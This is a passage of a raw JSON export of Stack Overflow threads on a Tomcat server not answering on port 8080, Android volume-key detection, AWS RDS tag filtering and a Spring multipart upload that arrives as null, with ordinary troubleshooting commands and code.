Bandara"},"down_vote_count":0,"up_vote_count":9,"is_accepted":false,"score":9,"last_activity_date":1629828231,"creation_date":1433418333,"answer_id":30642994,"question_id":8554663,"body_markdown":"Try to list out using following command on linux terminal TCP IP and port reference to the application like &quot;java&quot; as below.\r\n\r\n    [root@h5 ~]# netstat -ltnp | grep java -i --colour \r\n    tcp        0      0 10.15.11.20:9990    0.0.0.0:*               LISTEN      1626/java           \r\n    tcp        0      0 10.15.11.20:8080    0.0.0.0:*               LISTEN      1626/java           \r\n    tcp        0      0 10.15.11.20:8443    0.0.0.0:*               LISTEN      1626/java \r\n       \r\nFurther first you need to check the open ports at the firewall.\r\n\r\n    firewall-cmd --list-ports\r\n\r\nIf it is turn on and port is not there please allow the relevant port 8080 as below.\r\n\r\n    firewall-cmd --permanent --zone=public --add-port=8080\r\n    firewall-cmd --reload","title":"Tomcat is running but 8080 port is not responding","body":"<p>Try to list out using following command on linux terminal TCP IP and port reference to the application like &quot;java&quot; as below.</p>\n<pre><code>[root@h5 ~]# netstat -ltnp | grep java -i --colour \ntcp        0      0 10.15.11.20:9990    0.0.0.0:*               LISTEN      1626/java           \ntcp        0      0 10.15.11.20:8080    0.0.0.0:*               LISTEN      1626/java           \ntcp        0      0 10.15.11.20:8443    0.0.0.0:*               LISTEN      1626/java \n   \n</code></pre>\n<p>Further first you need to check the open ports at the firewall.</p>\n<pre><code>firewall-cmd --list-ports\n</code></pre>\n<p>If it is turn on and port is not there please allow the relevant port 8080 as below.</p>\n<pre><code>firewall-cmd --permanent --zone=public --add-port=8080\nfirewall-cmd --reload\n</code></pre>\n"},{"tags":[],"owner":{"account_id":151394,"reputation":52351,"user_id":365237,"accept_rate":96,"display_name":"eis"},"down_vote_count":0,"up_vote_count":11,"is_accepted":false,"score":11,"last_activity_date":1444769566,"creation_date":1444725003,"answer_id":33097741,"question_id":8554663,"body_markdown":"The problem for me was that my Tomcat started listening to IPv6 ONLY. Putting it here in case somebody else finds out the same thing.\r\n\r\nI was able to get proper responses with\r\n\r\n    curl -g -6 &quot;http://[::1]:8080/&quot;\r\n\r\nBut not with localhost.\r\nTo fix this, I *removed* `address` attribute from conf/server.xml:\r\n\r\n    &lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;\r\n               connectionTimeout=&quot;20000&quot;\r\n               redirectPort=&quot;8443&quot; URIEncoding=&quot;UTF-8&quot; /&gt;\r\n               address=&quot;0.0.0.0&quot; /&gt;\r\n\r\nand restarted and it bound to IPv4 again. I know it should be other way around, but this was what fixed it for me. OS was Ubuntu.","title":"Tomcat is running but 8080 port is not responding","body":"<p>The problem for me was that my Tomcat started listening to IPv6 ONLY. Putting it here in case somebody else finds out the same thing.</p>\n\n<p>I was able to get proper responses with</p>\n\n<pre><code>curl -g -6 \"http://[::1]:8080/\"\n</code></pre>\n\n<p>But not with localhost.\nTo fix this, I <em>removed</em> <code>address</code> attribute from conf/server.xml:</p>\n\n<pre><code>&lt;Connector port=\"8080\" protocol=\"HTTP/1.1\"\n           connectionTimeout=\"20000\"\n           redirectPort=\"8443\" URIEncoding=\"UTF-8\" /&gt;\n           address=\"0.0.0.0\" /&gt;\n</code></pre>\n\n<p>and restarted and it bound to IPv4 again. I know it should be other way around, but this was what fixed it for me. OS was Ubuntu.</p>\n"},{"tags":[],"owner":{"account_id":5161025,"reputation":3490,"user_id":4132714,"display_name":"PANKAJ VERMA"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1502096509,"creation_date":1502096509,"answer_id":45543087,"question_id":8554663,"body_markdown":"In case of war deployment if there is error in war file, tomcat may not be able to extract the war file. Make sure a folder having same name as war file is created in tomcat/&lt;version&gt;/libexec/webapps otherwise localhost:8080 will stuck.\r\n","title":"Tomcat is running but 8080 port is not responding","body":"<p>In case of war deployment if there is error in war file, tomcat may not be able to extract the war file. Make sure a folder having same name as war file is created in tomcat//libexec/webapps otherwise localhost:8080 will stuck.</p>\n"},{"tags":[],"owner":{"account_id":2481600,"reputation":989,"user_id":2160972,"display_name":"fafaro"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1521558010,"creation_date":1521558010,"answer_id":49387617,"question_id":8554663,"body_markdown":"Tomcat may be too slow to start if one of the deployed applications is too slow to initialize. You can tell this is the case when you&#39;ve started Tomcat, yet the browser says the server isn&#39;t responding, even though you can see that the port is listening (by connecting with telnet). Also note that your CPU usage may be too high. In my case, it was because I had enabled TRACE mode on the logger.","title":"Tomcat is running but 8080 port is not responding","body":"<p>Tomcat may be too slow to start if one of the deployed applications is too slow to initialize. You can tell this is the case when you've started Tomcat, yet the browser says the server isn't responding, even though you can see that the port is listening (by connecting with telnet). Also note that your CPU usage may be too high. In my case, it was because I had enabled TRACE mode on the logger.</p>\n"},{"tags":[],"owner":{"account_id":1890456,"reputation":2995,"user_id":1708697,"display_name":"Tom Chamberlain"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1534279028,"creation_date":1534279028,"answer_id":51849417,"question_id":8554663,"body_markdown":"On CentOs I had to open the firewall manually\r\n\r\n    sudo firewall-cmd --zone=public --add-port=7999/tcp --permanent\r\n    sudo firewall-cmd --reload\r\n\r\nNot sure how, but if Docker was running a container on the same port, it would automatically open the firewall and so was throwing me off","title":"Tomcat is running but 8080 port is not responding","body":"<p>On CentOs I had to open the firewall manually</p>\n\n<pre><code>sudo firewall-cmd --zone=public --add-port=7999/tcp --permanent\nsudo firewall-cmd --reload\n</code></pre>\n\n<p>Not sure how, but if Docker was running a container on the same port, it would automatically open the firewall and so was throwing me off</p>\n"},{"tags":[],"owner":{"account_id":8420550,"reputation":11,"user_id":6319477,"display_name":"simon otwero"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1588267649,"creation_date":1581557738,"answer_id":60199269,"question_id":8554663,"body_markdown":"\r\n\r\nYou can try confirm the status of the server by running:\r\n\r\n     lsof -i :8080","title":"Tomcat is running but 8080 port is not responding","body":"<p>You can try confirm the status of the server by running:</p>\n\n<pre><code> lsof -i :8080\n</code></pre>\n"},{"tags":[],"owner":{"account_id":19681615,"reputation":3,"user_id":14408610,"display_name":"sukumar_banda"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1602658927,"creation_date":1602658927,"answer_id":64348153,"question_id":8554663,"body_markdown":"[try this, it will solve the issue, Window -&gt; Web browser -&gt; Chrome. For external browser][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/oFyQi.png","title":"Tomcat is running but 8080 port is not responding","body":"<p><a href=\"https://i.stack.imgur.com/oFyQi.png\" rel=\"nofollow noreferrer\">try this, it will solve the issue, Window -&gt; Web browser -&gt; Chrome. For external browser</a></p>\n"}],"owner":{"account_id":1053092,"reputation":874,"user_id":1056488,"display_name":"Ulises Layera"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":96572,"favorite_count":0,"down_vote_count":0,"up_vote_count":18,"accepted_answer_id":8554703,"answer_count":9,"score":18,"last_activity_date":1640258316,"creation_date":1324241052,"question_id":8554663,"body_markdown":"I have installed sun `jdk 1.6 x64` and tomcat in a linux x64 machine through ssh, I don&#39;t have root privileges so I installed both in my home dir.\r\n\r\nI managed to successful run tomcat but if I try to enter mydomain.com:8080 there&#39;s no answer from the server.\r\n\r\nWith this command:\r\n\r\n    netstat -atnp|grep LISTEN\r\n\r\nI checked the port and it is LISTENING\r\n\r\n    Dec 18, 2011 5:11:20 PM org.apache.catalina.core.AprLifecycleListener init\r\n    INFO: The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: /home2/fiegmund/jdk1.6.0_25/jre/lib/amd64/server:/home2/fiegmund/jdk1.6.0_25/jre/lib/amd64:/home2/fiegmund/jdk1.6.0_25/jre/../lib/amd64:/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib\r\n    Dec 18, 2011 5:11:21 PM org.apache.coyote.AbstractProtocol init\r\n    INFO: Initializing ProtocolHandler [&quot;http-bio-8080&quot;]\r\n    Dec 18, 2011 5:11:21 PM org.apache.coyote.AbstractProtocol init\r\n    INFO: Initializing ProtocolHandler [&quot;ajp-bio-8009&quot;]\r\n    Dec 18, 2011 5:11:21 PM org.apache.catalina.startup.Catalina load\r\n    INFO: Initialization processed in 2015 ms\r\n    Dec 18, 2011 5:11:21 PM org.apache.catalina.core.StandardService startInternal\r\n    INFO: Starting service Catalina\r\n    Dec 18, 2011 5:11:21 PM org.apache.catalina.core.StandardEngine startInternal\r\n    INFO: Starting Servlet Engine: Apache Tomcat/7.0.23\r\n    Dec 18, 2011 5:11:21 PM org.apache.catalina.startup.HostConfig deployDirectory\r\n    INFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/docs\r\n    Dec 18, 2011 5:11:24 PM org.apache.catalina.util.SessionIdGenerator createSecureRandom\r\n    INFO: Creation of SecureRandom instance for session ID generation using [SHA1PRNG] took [1,869] milliseconds.\r\n    Dec 18, 2011 5:11:24 PM org.apache.catalina.startup.HostConfig deployDirectory\r\n    INFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/manager\r\n    Dec 18, 2011 5:11:24 PM org.apache.catalina.startup.HostConfig deployDirectory\r\n    INFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/ROOT\r\n    Dec 18, 2011 5:11:24 PM org.apache.catalina.startup.HostConfig deployDirectory\r\n    INFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/examples\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jstl/core is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jstl/sql_rt is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/sql is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jstl/core_rt is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/core is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/functions is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jstl/fmt is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://jakarta.apache.org/taglibs/standard/permittedTaglibs is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jstl/xml is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://jakarta.apache.org/taglibs/standard/scriptfree is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jstl/fmt_rt is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/fmt is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/xml is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jstl/xml_rt is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\r\n    INFO: TLD skipped. URI: http://java.sun.com/jstl/sql is already defined\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.HostConfig deployDirectory\r\n    INFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/host-manager\r\n    Dec 18, 2011 5:11:25 PM org.apache.coyote.AbstractProtocol start\r\n    INFO: Starting ProtocolHandler [&quot;http-bio-8080&quot;]\r\n    Dec 18, 2011 5:11:25 PM org.apache.coyote.AbstractProtocol start\r\n    INFO: Starting ProtocolHandler [&quot;ajp-bio-8009&quot;]\r\n    Dec 18, 2011 5:11:25 PM org.apache.catalina.startup.Catalina start\r\n    INFO: Server startup in 4582 ms&gt;\r\n\r\nAny ideas that what is the problem?\r\n\r\n\r\n\r\n","title":"Tomcat is running but 8080 port is not responding","body":"<p>I have installed sun <code>jdk 1.6 x64</code> and tomcat in a linux x64 machine through ssh, I don't have root privileges so I installed both in my home dir.</p>\n<p>I managed to successful run tomcat but if I try to enter mydomain.com:8080 there's no answer from the server.</p>\n<p>With this command:</p>\n<pre><code>netstat -atnp|grep LISTEN\n</code></pre>\n<p>I checked the port and it is LISTENING</p>\n<pre><code>Dec 18, 2011 5:11:20 PM org.apache.catalina.core.AprLifecycleListener init\nINFO: The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: /home2/fiegmund/jdk1.6.0_25/jre/lib/amd64/server:/home2/fiegmund/jdk1.6.0_25/jre/lib/amd64:/home2/fiegmund/jdk1.6.0_25/jre/../lib/amd64:/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib\nDec 18, 2011 5:11:21 PM org.apache.coyote.AbstractProtocol init\nINFO: Initializing ProtocolHandler [&quot;http-bio-8080&quot;]\nDec 18, 2011 5:11:21 PM org.apache.coyote.AbstractProtocol init\nINFO: Initializing ProtocolHandler [&quot;ajp-bio-8009&quot;]\nDec 18, 2011 5:11:21 PM org.apache.catalina.startup.Catalina load\nINFO: Initialization processed in 2015 ms\nDec 18, 2011 5:11:21 PM org.apache.catalina.core.StandardService startInternal\nINFO: Starting service Catalina\nDec 18, 2011 5:11:21 PM org.apache.catalina.core.StandardEngine startInternal\nINFO: Starting Servlet Engine: Apache Tomcat/7.0.23\nDec 18, 2011 5:11:21 PM org.apache.catalina.startup.HostConfig deployDirectory\nINFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/docs\nDec 18, 2011 5:11:24 PM org.apache.catalina.util.SessionIdGenerator createSecureRandom\nINFO: Creation of SecureRandom instance for session ID generation using [SHA1PRNG] took [1,869] milliseconds.\nDec 18, 2011 5:11:24 PM org.apache.catalina.startup.HostConfig deployDirectory\nINFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/manager\nDec 18, 2011 5:11:24 PM org.apache.catalina.startup.HostConfig deployDirectory\nINFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/ROOT\nDec 18, 2011 5:11:24 PM org.apache.catalina.startup.HostConfig deployDirectory\nINFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/examples\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jstl/core is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jstl/sql_rt is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/sql is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jstl/core_rt is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/core is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/functions is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jstl/fmt is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://jakarta.apache.org/taglibs/standard/permittedTaglibs is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jstl/xml is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://jakarta.apache.org/taglibs/standard/scriptfree is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jstl/fmt_rt is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/fmt is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jsp/jstl/xml is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jstl/xml_rt is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.TaglibUriRule body\nINFO: TLD skipped. URI: http://java.sun.com/jstl/sql is already defined\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.HostConfig deployDirectory\nINFO: Deploying web application directory /home2/fiegmund/apache-tomcat-7.0.23/webapps/host-manager\nDec 18, 2011 5:11:25 PM org.apache.coyote.AbstractProtocol start\nINFO: Starting ProtocolHandler [&quot;http-bio-8080&quot;]\nDec 18, 2011 5:11:25 PM org.apache.coyote.AbstractProtocol start\nINFO: Starting ProtocolHandler [&quot;ajp-bio-8009&quot;]\nDec 18, 2011 5:11:25 PM org.apache.catalina.startup.Catalina start\nINFO: Server startup in 4582 ms&gt;\n</code></pre>\n<p>Any ideas that what is the problem?</p>\n"},{"tags":["java","android","android-studio"],"answers":[{"tags":[],"owner":{"account_id":20094764,"reputation":2497,"user_id":14734532,"display_name":"DrHowdyDoo"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639669499,"creation_date":1639662324,"answer_id":70380080,"question_id":70379527,"body_markdown":"Try this, it will work :\r\n    \r\n    ArrayList&lt;Integer&gt; pressedkeys = new ArrayList&lt;&gt;(); \r\n    \r\n     @Override\r\n    public boolean onKeyDown(int keyCode, KeyEvent event) {\r\n\r\n        pressedkeys.add(keyCode);\r\n\r\n        if(event.isLongPress())\r\n        if(pressedkeys.contains(24) &amp;&amp; pressedkeys.contains(25)) {\r\n\r\n         //Do Something;    \r\n\r\n        }\r\n\r\n        return (true or false);\r\n    }\r\n    \r\n    @Override\r\n    public boolean onKeyUp(int keyCode, KeyEvent event) {\r\n        \r\n        pressedkeys.removeAll(Collections.singleton(keyCode));\r\n        return (true or false);\r\n    }\r\n\r\nReturn true if you handled the event and does not want anything else to happen or false if you want to allow the event to be handled by the next receiver.\r\n\r\nNote : Please feel free to improve my answer...\r\n\r\nYou can also checkout this : [Android 2 keys at a time][1]\r\n\r\n\r\n  [1]: https://stackoverflow.com/questions/8517041/android-2-keys-at-a-time","title":"press volume up and down button at same time for some period of time to perform specific function in java","body":"<p>Try this, it will work :</p>\n<pre><code>ArrayList&lt;Integer&gt; pressedkeys = new ArrayList&lt;&gt;(); \n\n @Override\npublic boolean onKeyDown(int keyCode, KeyEvent event) {\n\n    pressedkeys.add(keyCode);\n\n    if(event.isLongPress())\n    if(pressedkeys.contains(24) &amp;&amp; pressedkeys.contains(25)) {\n\n     //Do Something;    \n\n    }\n\n    return (true or false);\n}\n\n@Override\npublic boolean onKeyUp(int keyCode, KeyEvent event) {\n    \n    pressedkeys.removeAll(Collections.singleton(keyCode));\n    return (true or false);\n}\n</code></pre>\n<p>Return true if you handled the event and does not want anything else to happen or false if you want to allow the event to be handled by the next receiver.</p>\n<p>Note : Please feel free to improve my answer...</p>\n<p>You can also checkout this : <a href=\"https://stackoverflow.com/questions/8517041/android-2-keys-at-a-time\">Android 2 keys at a time</a></p>\n"}],"owner":{"account_id":23665575,"reputation":1,"user_id":17693065,"display_name":"Saurav Rajbhandari"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":870,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1640258142,"creation_date":1639659912,"question_id":70379527,"body_markdown":"how can i detect if volume up and down buttons are pressed simultaneously for certain period of time to perform specific task on android. I&#39;m currently using java to develop an application which increment the count on pressing volume up and down button together for some period of time.\r\n\r\n```\r\nif(keycode == KeyEvent.KEYCODE_VOLUME_DOWN &amp;&amp; keycode == KeyEvent.KEYCODE_VOLUME_UP) {\r\n    // Two buttons pressed, call your function\r\n    count++;\r\n    String num = String.valueOf(count);\r\n    number.setText(num);\r\n    Toast.makeText(getApplicationContext(), &quot;Hello&quot;, Toast.LENGTH_SHORT).show();\r\n}\r\n```\r\nI tried this code but it didn&#39;t work \r\n\r\nI also used boolean\r\n```\r\nwhile(keycode == KeyEvent.KEYCODE_VOLUME_DOWN || keycode == KeyEvent.KEYCODE_VOLUME_UP){\r\n    if (keycode == KeyEvent.KEYCODE_VOLUME_DOWN){\r\n        down = true;\r\n        if(keycode == KeyEvent.KEYCODE_VOLUME_UP){\r\n            up = true;\r\n            if(up &amp;&amp; down) {\r\n                // Two buttons pressed, call your function\r\n                Toast.makeText(getApplicationContext(), &quot;Hello&quot;, \r\n                               Toast.LENGTH_SHORT).show();\r\n            }\r\n        }\r\n    }\r\n}\r\n```","title":"press volume up and down button at same time for some period of time to perform specific function in java","body":"<p>how can i detect if volume up and down buttons are pressed simultaneously for certain period of time to perform specific task on android. I'm currently using java to develop an application which increment the count on pressing volume up and down button together for some period of time.</p>\n<pre><code>if(keycode == KeyEvent.KEYCODE_VOLUME_DOWN &amp;&amp; keycode == KeyEvent.KEYCODE_VOLUME_UP) {\n    // Two buttons pressed, call your function\n    count++;\n    String num = String.valueOf(count);\n    number.setText(num);\n    Toast.makeText(getApplicationContext(), &quot;Hello&quot;, Toast.LENGTH_SHORT).show();\n}\n</code></pre>\n<p>I tried this code but it didn't work</p>\n<p>I also used boolean</p>\n<pre><code>while(keycode == KeyEvent.KEYCODE_VOLUME_DOWN || keycode == KeyEvent.KEYCODE_VOLUME_UP){\n    if (keycode == KeyEvent.KEYCODE_VOLUME_DOWN){\n        down = true;\n        if(keycode == KeyEvent.KEYCODE_VOLUME_UP){\n            up = true;\n            if(up &amp;&amp; down) {\n                // Two buttons pressed, call your function\n                Toast.makeText(getApplicationContext(), &quot;Hello&quot;, \n                               Toast.LENGTH_SHORT).show();\n            }\n        }\n    }\n}\n</code></pre>\n"},{"tags":["java","amazon-web-services","amazon-rds"],"answers":[{"tags":[],"owner":{"account_id":58377,"reputation":247890,"user_id":174777,"display_name":"John Rotenstein"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640257869,"creation_date":1640257869,"answer_id":70461323,"question_id":70459333,"body_markdown":"No. The `DescribeDbInstances()` API call can only filter on IDs, domain and engine.\r\n\r\nYou would need to do the filtering in your own code.","title":"Is it possible get Aws Rds DbInstances by TAG?","body":"<p>No. The <code>DescribeDbInstances()</code> API call can only filter on IDs, domain and engine.</p>\n<p>You would need to do the filtering in your own code.</p>\n"}],"owner":{"account_id":10208055,"reputation":917,"user_id":7697901,"display_name":"Alexandr Kovalenko"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":203,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70461323,"answer_count":1,"score":0,"last_activity_date":1640257869,"creation_date":1640247131,"question_id":70459333,"body_markdown":"So, I&#39;m using Java API: AWS SDK - 2.17 (v2)\r\n\r\n[API_DescribeDBInstances][1]\r\n\r\n  [1]: https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBInstances.html\r\nThere are a couple of default filters, but I want to use my own filter created by TAG.\r\n\r\nFor example, I can use Filter by Tag for retrieve EC2 instances, but I can&#39;t understand how to do that for DbInstances?\r\n\r\nThis doesn&#39;t work\r\n \r\n\r\n        Filter filter = Filter.builder().name(&quot;TAG_NAME&quot;).values(&quot;TAG_VALUE&quot;).build();\r\n        DescribeDbInstancesRequest request = DescribeDbInstancesRequest.builder()\r\n                .filters(filter)\r\n                .build();\r\n        DescribeDbInstancesResponse response = amazonRDS.describeDBInstances(request);\r\n\r\nBut pretty same code works for EC2 Instances (API v1)","title":"Is it possible get Aws Rds DbInstances by TAG?","body":"<p>So, I'm using Java API: AWS SDK - 2.17 (v2)</p>\n<p><a href=\"https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBInstances.html\" rel=\"nofollow noreferrer\">API_DescribeDBInstances</a></p>\n<p>There are a couple of default filters, but I want to use my own filter created by TAG.</p>\n<p>For example, I can use Filter by Tag for retrieve EC2 instances, but I can't understand how to do that for DbInstances?</p>\n<p>This doesn't work</p>\n<pre><code>    Filter filter = Filter.builder().name(&quot;TAG_NAME&quot;).values(&quot;TAG_VALUE&quot;).build();\n    DescribeDbInstancesRequest request = DescribeDbInstancesRequest.builder()\n            .filters(filter)\n            .build();\n    DescribeDbInstancesResponse response = amazonRDS.describeDBInstances(request);\n</code></pre>\n<p>But pretty same code works for EC2 Instances (API v1)</p>\n"},{"tags":["java","file-upload","https"],"answers":[{"tags":[],"owner":{"account_id":3106126,"reputation":31241,"user_id":2628868,"accept_rate":84,"display_name":"Dolphin"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640257779,"creation_date":1640257779,"answer_id":70461303,"question_id":70460865,"body_markdown":"We should not use file, just use `Multipart/form-data`:\r\n\r\n\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/cSZO6.png","title":"why the server side recieve null when upload file through https","body":"<p>We should not use file, just use <code>Multipart/form-data</code>:</p>\n<p><a href=\"https://i.stack.imgur.com/cSZO6.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/cSZO6.png\" alt=\"enter image description here\" /></a></p>\n"}],"owner":{"account_id":3106126,"reputation":31241,"user_id":2628868,"accept_rate":84,"display_name":"Dolphin"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":48,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640257779,"creation_date":1640255594,"question_id":70460865,"body_markdown":"I am using https to upload a excel file, this is my server side Java code:\r\n\r\n\r\n\r\n\r\n    @RequestMapping(&quot;/dolphin/report/org/user/import&quot;)\r\n    public interface IOrgUserImportController {\r\n    \r\n    \r\n        @PostMapping(&quot;/list&quot;)\r\n        Response orgUserImport(@RequestBody MultipartFile file);\r\n    }\r\n\r\n\r\nnow I tried to using postman to test the api, the problem is on the server side, MultipartFile was recieved null. I tried to use Charles to capture the http request(Could not found the request from DevTools), the request look like this:\r\n\r\n\r\n\r\n    URL\thttps://admin.example.com\r\n    Status\tComplete\r\n    Notes\tSSL Proxying not enabled for this host: enable in Proxy Settings, SSL locations\r\n    Response Code\t200 Connection established\r\n    Protocol\tHTTP/1.1\r\n    TLS\tTLSv1.2 (TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256)\r\n    Method\tCONNECT\r\n    Kept Alive\tNo\r\n    Content-Type\t\r\n    Client Address\t127.0.0.1:49462\r\n    Remote Address\tadmin.example.com/67.11.108.24:443\r\n    Connection\t\r\n    WebSockets\t-\r\n    Timing\t\r\n    Size\t\r\n    Request\t10.03 KB (10,268 bytes)\r\n    TLS Handshake\t1.29 KB (1,318 bytes)\r\n    Header\t-\r\n    Query String\t-\r\n    Cookies\t-\r\n    Body\t8.74 KB (8,950 bytes)\r\n    Uncompressed Body\t-\r\n    Compression\t-\r\n    Response\t26.71 KB (27,353 bytes)\r\n    Total\t36.74 KB (37,621 bytes)\r\n\r\n\r\n\r\n\r\n\r\n\r\nthe body was not null, why the server did not recieve the content? what should I do to fix this problem? This is the curl I pasted from postman:\r\n\r\n\r\n\r\n    curl --location --request POST &#39;https://admin.example.com/service/soa-dolphin-org/service/dolphin/report/org/user/import/list&#39; \\\r\n    --header &#39;token: 0e3a2907dfe490eae2c1erea4726c9de7&#39; \\\r\n    --header &#39;Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&#39; \\\r\n    --data-binary &#39;@/Users/dolphin/Downloads/Book1.xlsx&#39;\r\n\r\n\r\n\r\n\r\n\r\n\r\n","title":"why the server side recieve null when upload file through https","body":"<p>I am using https to upload a excel file, this is my server side Java code:</p>\n<pre><code>@RequestMapping(&quot;/dolphin/report/org/user/import&quot;)\npublic interface IOrgUserImportController {\n\n\n    @PostMapping(&quot;/list&quot;)\n    Response orgUserImport(@RequestBody MultipartFile file);\n}\n</code></pre>\n<p>now I tried to using postman to test the api, the problem is on the server side, MultipartFile was recieved null. I tried to use Charles to capture the http request(Could not found the request from DevTools), the request look like this:</p>\n<pre><code>URL https://admin.example.com\nStatus  Complete\nNotes   SSL Proxying not enabled for this host: enable in Proxy Settings, SSL locations\nResponse Code   200 Connection established\nProtocol    HTTP/1.1\nTLS TLSv1.2 (TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256)\nMethod  